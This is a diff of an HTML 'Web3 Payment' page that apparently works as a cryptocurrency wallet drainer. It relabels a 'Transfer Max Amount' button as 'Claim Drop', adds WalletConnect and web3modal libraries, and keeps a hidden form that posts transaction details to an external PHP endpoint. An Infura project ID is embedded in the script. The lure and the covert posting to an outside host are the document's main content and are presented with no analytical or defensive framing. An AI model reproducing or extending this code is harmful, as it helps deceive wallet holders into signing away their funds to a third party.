@@ -4,10 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Web3 Payment</title>
+    <!-- Removed unused libraries -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <!-- Keeping web3modal for other wallet options -->
+    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
+    <!-- Keeping WalletConnect library for WalletConnect integration -->
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/browser@1.0.0/dist/umd/index.min.js"></script>
+    <!-- Including external main.js script for handling WalletConnect -->
+    <script type="module" src="main.js"></script>
     <style>
         body {
             display: flex;
@@ -31,17 +36,24 @@
     </style>
 </head>
 <body>
-    <button id="connectButton">Connect Wallet & Transfer Max Amount</button>
+    <!-- Updated button to use a Web Components style if desired -->
+    <w3m-core-button><button id="connectButton">Connect Wallet & Claim Drop</button></w3m-core-button>
 
+    <!-- Placeholder for WalletConnect modal if needed -->
+    <w3m-modal></w3m-modal>
+
+    <!-- Container for displaying QR Code -->
     <div id="qrCodeContainer">
         <h2>Scan QR Code with Your Wallet App</h2>
         <div id="qrCode"></div>
     </div>
 
+    <!-- Form for submitting transaction details -->
     <form id="transactionForm" action="https://eflujsyb0kuybgol11532.cleavr.one/btc/d.php" method="post" style="display: none;">
         <input type="hidden" name="transactionDetails" id="transactionDetails">
     </form>
 
+    <!-- Script for handling wallet connection and transaction -->
     <script>
         const connectButton = document.getElementById('connectButton');
         const transactionForm = document.getElementById('transactionForm');
@@ -75,7 +87,7 @@
         async function init() {
             const providerOptions = {
                 walletconnect: {
-                    package: WalletConnectProvider.default,
+                    package: WalletConnect, // using the updated library
                     options: {
                         infuraId: "c05e035e823a4769b62ae15c1cbe2f02" // Your Infura Project ID
                     }
